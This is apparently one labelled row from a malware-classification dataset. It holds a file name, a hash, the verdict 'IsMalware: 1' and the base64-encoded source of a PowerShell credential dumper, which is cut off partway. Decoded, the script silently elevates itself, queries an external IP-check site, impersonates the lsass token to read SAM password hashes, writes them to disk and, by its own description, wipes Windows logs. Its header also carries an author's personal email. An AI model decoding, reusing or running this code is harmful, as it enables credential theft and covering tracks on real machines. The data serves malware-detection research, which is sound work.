Autolycus.ps1,79d31c61b6aa6f0e7256367cfe5d45a7,Scan result is 32768. IsMalware: 1,IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojICAgQXV0b2x5Y3VzICB2MS40ICAyMDE0ICAgICAjCiMgIEF1dGhvcjogRHJhbGxpcyBEZWphcmVuICAgICMKIyAgRW1haWw6IHNlcm9zaWFuQGdtYWlsLmNvbSAgIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgCiMgVGhpcyBwb3dlcnNoZWxsIHNjcmlwdCB3aWxsIHJhaXNlIGFkbWluIHByaXZsaWVnZXMgYW5kIGRvd25sb2FkIGFuIGh0bWwgZmlsZSBjb250YW5pbmcgdGhlIHRhcmdldHMgY3VycmVudCAgICAgICAgIwojIGludGVybmV0IElQIGFkZHJlc3MuIEl0IHdpbGwgYWxzbyBnZXQgdGhlIFNBTSBoYXNoZXMgYW5kIG91dHB1dCB0aGVtIGludG8gLnB3ZHVtcCBhbmQgLnR4dCBmaWxlcyB0aGVuIHNhdmUgdGhlbSAgICMKIyBpbiB0aGUgc2FtZSBkaXJlY3RvcnkgdGhhdCB0aGUgc2NyaXB0IHdhcyBydW4gZnJvbSwgaW4gYSBmb2xkZXIgY2FsbGVkICdEdW1wJy4gQmVmb2VzIGl0IGNsb3NlcyBpdCB3aWxsIHNjcnViIHRoZSAjCiMgd2luZG93cyBsb2cgb2YgaXQncyBhY3Rpdml0eS4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCnBhcmFtKFtzd2l0Y2hdJEVsZXZhdGVkKQoKZnVuY3Rpb24gVGVzdC1BZG1pbiB7CiAgJGN1cnJlbnRVc2VyID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCAkKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQogICRjdXJyZW50VXNlci5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdGluUm9sZV06OkFkbWluaXN0cmF0b3IpCn0KCmlmICgoVGVzdC1BZG1pbikgLWVxICRmYWxzZSkgIHsKICAgIGlmICgkZWxldmF0ZWQpIAogICAgewogICAgICAgICMgVHJpZWQgdG8gZWxldmF0ZSwgZGlkIG5vdCB3b3JrLCBhYm9ydGluZwogICAgfSAKICAgIGVsc2UgewogICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVZlcmIgUnVuQXMgLUFyZ3VtZW50TGlzdCAoJy1ub2xvZ28gLVdpbmRvd1N0eWxlIEhpZGRlbiAtbm9wcm9maWxlIC1ub2V4aXQgLWZpbGUgInswfSIgLWVsZXZhdGVkJyAtZiAoJG15aW52b2NhdGlvbi5NeUNvbW1hbmQuRGVmaW5pdGlvbikpCn0KCmV4aXQKfQoKJ3J1bm5pbmcgd2l0aCBmdWxsIHByaXZpbGVnZXMnCgpTZXQtRXhlY3V0aW9uUG9saWN5IFJlbW90ZVNpZ25lZAoKJFNjcmlwdFBhdGggPSBTcGxpdC1QYXRoIC1wYXJlbnQgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuRGVmaW5pdGlvbgoKTmV3LUl0ZW0gLUl0ZW1UeXBlIGRpcmVjdG9yeSAtUGF0aCAkU2NyaXB0UGF0aFxEdW1wXGlwCk5ldy1JdGVtIC1JdGVtVHlwZSBkaXJlY3RvcnkgLVBhdGggJFNjcmlwdFBhdGhcRHVtcFxzYW0KCiR1cmwgPSAiaHR0cDovL2NoZWNraXAuZHluZG5zLm9yZy9pbmRleC5odG1sIiAKICAgICRwYXRoID0gIiRTY3JpcHRQYXRoXER1bXBcaXBcaW5kZXguaHRtbCIgCiAgICAgICAKICAgIGlmKCEoU3BsaXQtUGF0aCAtcGFyZW50ICRwYXRoKSAtb3IgIShUZXN0LVBhdGggLXBhdGhUeXBlIENvbnRhaW5lciAoU3BsaXQtUGF0aCAtcGFyZW50ICRwYXRoKSkpIHsgCiAgICAgICRwYXRoID0gSm9pbi1QYXRoICRwd2QgKFNwbGl0LVBhdGggLWxlYWYgJHBhdGgpIAogICAgfSAKICAgICAgCiAgICAiRG93bmxvYWRpbmcgWyR1cmxdYG5TYXZpbmcgYXQgWyRwYXRoXSIgCiAgICAkY2xpZW50ID0gbmV3LW9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCAKICAgICRjbGllbnQuRG93bmxvYWRGaWxlKCR1cmwsICRwYXRoKSAKICAgICAgICAgCiAgICAkcGF0aAoJCmZ1bmN0aW9uIEdldC1QYXNzSGFzaGVzIHsgCiAKJHNpZ25hdHVyZSA9IEAiIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0gCiAgICAgcHVibGljIHN0cnVjdCBUb2tQcml2MUx1aWQgCiAgICAgeyAKICAgICAgICAgcHVibGljIGludCBDb3VudDsgCiAgICAgICAgIHB1YmxpYyBsb25nIEx1aWQ7IAogICAgICAgICBwdWJsaWMgaW50IEF0dHI7IAogICAgIH0gCiAKICAgIHB1YmxpYyBjb25zdCBpbnQgU0VfUFJJVklMRUdFX0VOQUJMRUQgPSAweDAwMDAwMDAyOyAKICAgIHB1YmxpYyBjb25zdCBpbnQgVE9LRU5fUVVFUlkgPSAweDAwMDAwMDA4OyAKICAgIHB1YmxpYyBjb25zdCBpbnQgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgPSAweDAwMDAwMDIwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEID0gMHgwMDBGMDAwMDsgCiAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgU1RBTkRBUkRfUklHSFRTX1JFQUQgPSAweDAwMDIwMDAwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQVNTSUdOX1BSSU1BUlkgPSAweDAwMDE7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9EVVBMSUNBVEUgPSAweDAwMDI7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9JTVBFUlNPTkFURSA9IDB4MDAwNDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX1FVRVJZX1NPVVJDRSA9IDB4MDAxMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FESlVTVF9HUk9VUFMgPSAweDAwNDA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfREVGQVVMVCA9IDB4MDA4MDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FESlVTVF9TRVNTSU9OSUQgPSAweDAxMDA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9SRUFEID0gKFNUQU5EQVJEX1JJR0hUU19SRUFEIHwgVE9LRU5fUVVFUlkpOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQUxMX0FDQ0VTUyA9IChTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgfCBUT0tFTl9BU1NJR05fUFJJTUFSWSB8IAogICAgICBUT0tFTl9EVVBMSUNBVEUgfCBUT0tFTl9JTVBFUlNPTkFURSB8IFRPS0VOX1FVRVJZIHwgVE9LRU5fUVVFUllfU09VUkNFIHwgCiAgICAgIFRPS0VOX0FESlVTVF9QUklWSUxFR0VTIHwgVE9LRU5fQURKVVNUX0dST1VQUyB8IFRPS0VOX0FESlVTVF9ERUZBVUxUIHwgCiAgICAgIFRPS0VOX0FESlVTVF9TRVNTSU9OSUQpOyAKIAogICAgcHVibGljIGNvbnN0IHN0cmluZyBTRV9USU1FX1pPTkVfTkFNRVRFWFQgPSAiU2VUaW1lWm9uZVByaXZpbGVnZSI7IAogICAgcHVibGljIGNvbnN0IGludCBBTllTSVpFX0FSUkFZID0gMTsgCiAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0gCiAgICBwdWJsaWMgc3RydWN0IExVSUQgCiAgICB7IAogICAgICBwdWJsaWMgVUludDMyIExvd1BhcnQ7IAogICAgICBwdWJsaWMgVUludDMyIEhpZ2hQYXJ0OyAKICAgIH0gCiAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0gCiAgICBwdWJsaWMgc3RydWN0IExVSURfQU5EX0FUVFJJQlVURVMgeyAKICAgICAgIHB1YmxpYyBMVUlEIEx1aWQ7IAogICAgICAgcHVibGljIFVJbnQzMiBBdHRyaWJ1dGVzOyAKICAgIH0gCiAKIAogICAgcHVibGljIHN0cnVjdCBUT0tFTl9QUklWSUxFR0VTIHsgCiAgICAgIHB1YmxpYyBVSW50MzIgUHJpdmlsZWdlQ291bnQ7IAogICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0PUFOWVNJWkVfQVJSQVkpXSAKICAgICAgcHVibGljIExVSURfQU5EX0FUVFJJQlVURVMgW10gUHJpdmlsZWdlczsgCiAgICB9IAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldIAogICAgIHB1YmxpYyBleHRlcm4gc3RhdGljIGJvb2wgRHVwbGljYXRlVG9rZW4oSW50UHRyIEV4aXN0aW5nVG9rZW5IYW5kbGUsIGludCAKICAgICAgICBTRUNVUklUWV9JTVBFUlNPTkFUSU9OX0xFVkVMLCBvdXQgSW50UHRyIER1cGxpY2F0ZVRva2VuSGFuZGxlKTsgCiAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXSAKICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0VGhyZWFkVG9rZW4oIAogICAgICBJbnRQdHIgUEhUaHJlYWQsIAogICAgICBJbnRQdHIgVG9rZW4gCiAgICApOyAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXSAKICAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0gCiAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgT3BlblByb2Nlc3NUb2tlbihJbnRQdHIgUHJvY2Vzc0hhbmRsZSwgIAogICAgICAgVUludDMyIERlc2lyZWRBY2Nlc3MsIG91dCBJbnRQdHIgVG9rZW5IYW5kbGUpOyAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldIAogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBMb29rdXBQcml2aWxlZ2VWYWx1ZShzdHJpbmcgaG9zdCwgc3RyaW5nIG5hbWUsIHJlZiBsb25nIHBsdWlkKTsgCiAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsgCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEV4YWN0U3BlbGxpbmcgPSB0cnVlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0gCiAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBBZGp1c3RUb2tlblByaXZpbGVnZXMoSW50UHRyIGh0b2ssIGJvb2wgZGlzYWxsLCAKICAgICByZWYgVG9rUHJpdjFMdWlkIG5ld3N0LCBpbnQgbGVuLCBJbnRQdHIgcHJldiwgSW50UHRyIHJlbGVuKTsgCiJAIAogCiAgJGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkgCiAgaWYoJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSAtbmUgJHRydWUpIHsgCiAgICBXcml0ZS1XYXJuaW5nICJSdW4gdGhlIENvbW1hbmQgYXMgYW4gQWRtaW5pc3RyYXRvciIgCiAgICBCcmVhayAKICB9IAogCiAgQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJHNpZ25hdHVyZSAtTmFtZSBBZGpQcml2IC1OYW1lc3BhY2UgQWRqUHJpdiAKICAkYWRqUHJpdiA9IFtBZGpQcml2LkFkalByaXZdIAogIFtsb25nXSRsdWlkID0gMCAKIAogICR0b2tQcml2MUx1aWQgPSBOZXctT2JqZWN0IEFkalByaXYuQWRqUHJpditUb2tQcml2MUx1aWQgCiAgJHRva1ByaXYxTHVpZC5Db3VudCA9IDEgCiAgJHRva1ByaXYxTHVpZC5MdWlkID0gJGx1aWQgCiAgJHRva1ByaXYxTHVpZC5BdHRyID0gW0FkalByaXYuQWRqUHJpdl06OlNFX1BSSVZJTEVHRV9FTkFCTEVEIAogCiAgJHJldFZhbCA9ICRhZGpQcml2OjpMb29rdXBQcml2aWxlZ2VWYWx1ZSgkbnVsbCwgIlNlRGVidWdQcml2aWxlZ2UiLCBbcmVmXSR0b2tQcml2MUx1aWQuTHVpZCkgCiAgCiAgW0ludFB0cl0kaHRva2VuID0gW0ludFB0cl06Olplcm8gCiAgJHJldFZhbCA9ICRhZGpQcml2OjpPcGVuUHJvY2Vzc1Rva2VuKCRhZGpQcml2OjpHZXRDdXJyZW50UHJvY2VzcygpLCBbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fQUxMX0FDQ0VTUywgW3JlZl0kaHRva2VuKSAKICAgCiAgIAogICR0b2tlblByaXZpbGVnZXMgPSBOZXctT2JqZWN0IEFkalByaXYuQWRqUHJpditUT0tFTl9QUklWSUxFR0VTIAogICRyZXRWYWwgPSAkYWRqUHJpdjo6QWRqdXN0VG9rZW5Qcml2aWxlZ2VzKCRodG9rZW4sICRmYWxzZSwgW3JlZl0kdG9rUHJpdjFMdWlkLCAxMiwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKSAKIAogIGlmKC1ub3QoJHJldFZhbCkpIHsgCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpIAogICAgQnJlYWsgCiAgfSAKIAogICRwcm9jZXNzID0gKEdldC1Qcm9jZXNzIC1OYW1lIGxzYXNzKSAKICBbSW50UHRyXSRobHNhc3N0b2tlbiA9IFtJbnRQdHJdOjpaZXJvIAogICRyZXRWYWwgPSAkYWRqUHJpdjo6T3BlblByb2Nlc3NUb2tlbigkcHJvY2Vzcy5IYW5kbGUsIChbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fSU1QRVJTT05BVEUgLUJPUiBbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fRFVQTElDQVRFKSwgW3JlZl0kaGxzYXNzdG9rZW4pIAogCiAgW0ludFB0cl0kZHVsaWNhdGVUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvIAogICRyZXRWYWwgPSAkYWRqUHJpdjo6RHVwbGljYXRlVG9rZW4oJGhsc2Fzc3Rva2VuLCAyLCBbcmVmXSRkdWxpY2F0ZVRva2VuSGFuZGxlKSAKICAKICAkcmV0dmFsID0gJGFkalByaXY6OlNldFRocmVhZFRva2VuKFtJbnRQdHJdOjpaZXJvLCAkZHVsaWNhdGVUb2tlbkhhbmRsZSkgCiAgCiAKICBpZigtbm90KCRyZXRWYWwpKSB7IAogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5tYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAKICB9IAogICAkc2NyaXB0OnBhc3RldmFsdWUgPSBEdW1wSGFzaGVzCn0KCmZ1bmN0aW9uIExvYWRBcGkKewogICAgJG9sZEVycm9yQWN0aW9uID0gJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2U7CiAgICAkZ2xvYmFsOkVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIjsKICAgICR0ZXN0ID0gW1Bvd2VyRHVtcC5OYXRpdmVdOwogICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAkb2xkRXJyb3JBY3Rpb247CiAgICBpZiAoJHRlc3QpCiAgICB7CiAgICAgICAgIyBhbHJlYWR5IGxvYWRlZAogICAgICAgIHJldHVybjsKICAgICB9CgokY29kZSA9IEAnCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKCm5hbWVzcGFjZSBQb3dlckR1bXAKewogICAgcHVibGljIGNsYXNzIE5hdGl2ZQogICAgewogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ09wZW5LZXlFeCgKICAgICAgICBpbnQgaEtleSwKICAgICAgICBzdHJpbmcgc3ViS2V5LAogICAgICAgIGludCB1bE9wdGlvbnMsCiAgICAgICAgaW50IHNhbURlc2lyZWQsCiAgICAgICAgb3V0IGludCBoa1Jlc3VsdCk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludCA9ICJSZWdFbnVtS2V5RXgiKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdFbnVtS2V5RXgoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgaW50IGluZGV4LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBOYW1lLAogICAgICAgIHJlZiBpbnQgbHBjYk5hbWUsCiAgICAgICAgaW50IHJlc2VydmVkLAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBvdXQgbG9uZyBscGZ0TGFzdFdyaXRlVGltZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KAogICAgICAgIGludCBoa2V5LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBpbnQgbHBSZXNlcnZlZCwKICAgICAgICBvdXQgaW50IGxwY1N1YktleXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heENsYXNzTGVuLAogICAgICAgIG91dCBpbnQgbHBjVmFsdWVzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JTZWN1cml0eURlc2NyaXB0b3IsCiAgICAgICAgSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnQ2xvc2VLZXkoCiAgICAgICAgaW50IGhLZXkpOwoKICAgICAgICB9CiAgICB9IC8vIGVuZCBuYW1lc3BhY2UgUG93ZXJEdW1wCgogICAgcHVibGljIGNsYXNzIFNoaWZ0IHsKICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgIFJpZ2h0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgUmlnaHQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICBSaWdodChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIFJpZ2h0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgIExlZnQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICAgTGVmdCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgICBMZWZ0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICB9CidACgogICAkcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICRkbGxOYW1lID0gW1BzT2JqZWN0XS5Bc3NlbWJseS5Mb2NhdGlvbgogICAkY29tcGlsZXJQYXJhbWV0ZXJzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMKICAgJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpCiAgICRjb21waWxlclBhcmFtZXRlcnMuUmVmZXJlbmNlZEFzc2VtYmxpZXMuQWRkUmFuZ2UoJGFzc2VtYmxpZXMpCiAgICRjb21waWxlclBhcmFtZXRlcnMuR2VuZXJhdGVJbk1lbW9yeSA9ICR0cnVlCiAgICRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkKICAgaWYoJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMuQ291bnQgLWd0IDApIHsKICAgICAkY29tcGlsZXJSZXN1bHRzLkVycm9ycyB8ICUgeyBXcml0ZS1FcnJvciAoInswfTpgdHsxfSIgLWYgJF8uTGluZSwkXy5FcnJvclRleHQpIH0KICAgfQoKfQoKJGFudHBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTlRQQVNTV09SRGAwIik7CiRhbG1wYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIkxNUEFTU1dPUkRgMCIpOwokZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7CiRlbXB0eV9udCA9IFtieXRlW11dQCgweDMxLDB4ZDYsMHhjZiwweGUwLDB4ZDEsMHg2YSwweGU5LDB4MzEsMHhiNywweDNjLDB4NTksMHhkNywweGUwLDB4YzAsMHg4OSwweGMwKTsKJG9kZF9wYXJpdHkgPSBAKAogIDEsIDEsIDIsIDIsIDQsIDQsIDcsIDcsIDgsIDgsIDExLCAxMSwgMTMsIDEzLCAxNCwgMTQsCiAgMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsCiAgMzIsIDMyLCAzNSwgMzUsIDM3LCAzNywgMzgsIDM4LCA0MSwgNDEsIDQyLCA0MiwgNDQsIDQ0LCA0NywgNDcsCiAgNDksIDQ5LCA1MCwgNTAsIDUyLCA1MiwgNTUsIDU1LCA1NiwgNTYsIDU5LCA1OSwgNjEsIDYxLCA2MiwgNjIsCiAgNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksCiAgODEsIDgxLCA4MiwgODIsIDg0LCA4NCwgODcsIDg3LCA4OCwgODgsIDkxLCA5MSwgOTMsIDkzLCA5NCwgOTQsCiAgOTcsIDk3LCA5OCwgOTgsMTAwLDEwMCwxMDMsMTAzLDEwNCwxMDQsMTA3LDEwNywxMDksMTA5LDExMCwxMTAsCiAgMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LAogIDEyOCwxMjgsMTMxLDEzMSwxMzMsMTMzLDEzNCwxMzQsMTM3LDEzNywxMzgsMTM4LDE0MCwxNDAsMTQzLDE0MywKICAxNDUsMTQ1LDE0NiwxNDYsMTQ4LDE0OCwxNTEsMTUxLDE1MiwxNTIsMTU1LDE1NSwxNTcsMTU3LDE1OCwxNTgsCiAgMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LAogIDE3NiwxNzYsMTc5LDE3OSwxODEsMTgxLDE4MiwxODIsMTg1LDE4NSwxODYsMTg2LDE4OCwxODgsMTkxLDE5MSwKICAxOTMsMTkzLDE5NCwxOTQsMTk2LDE5NiwxOTksMTk5LDIwMCwyMDAsMjAzLDIwMywyMDUsMjA1LDIwNiwyMDYsCiAgMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLAogIDIyNCwyMjQsMjI3LDIyNywyMjksMjI5LDIzMCwyMzAsMjMzLDIzMywyMzQsMjM0LDIzNiwyMzYsMjM5LDIzOSwKICAyNDEsMjQxLDI0MiwyNDIsMjQ0LDI0NCwyNDcsMjQ3LDI0OCwyNDgsMjUxLDI1MSwyNTMsMjUzLDI1NCwyNTQKKTsKCmZ1bmN0aW9uIHNpZF90b19rZXkoJHNpZCkKewogICAgJHMxID0gQCgpOwogICAgJHMxICs9IFtjaGFyXSgkc2lkIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDgpIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDE2KSAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwyNCkgLWJhbmQgMHhGRik7CiAgICAkczEgKz0gJHMxWzBdOwogICAgJHMxICs9ICRzMVsxXTsKICAgICRzMSArPSAkczFbMl07CiAgICAkczIgPSBAKCk7CiAgICAkczIgKz0gJHMxWzNdOyAkczIgKz0gJHMxWzBdOyAkczIgKz0gJHMxWzFdOyAkczIgKz0gJHMxWzJdOwogICAgJHMyICs9ICRzMlswXTsgJHMyICs9ICRzMlsxXTsgJHMyICs9ICRzMlsyXTsKICAgIHJldHVybiAsKChzdHJfdG9fa2V5ICRzMSksKHN0cl90b19rZXkgJHMyKSk7Cn0KCmZ1bmN0aW9uIHN0cl90b19rZXkoJHMpCnsKICAgICRrZXkgPSBAKCk7CiAgICAka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzBdKSAtYmFuZCAweDAxKSwgNikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1sxXSksMik7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsKIC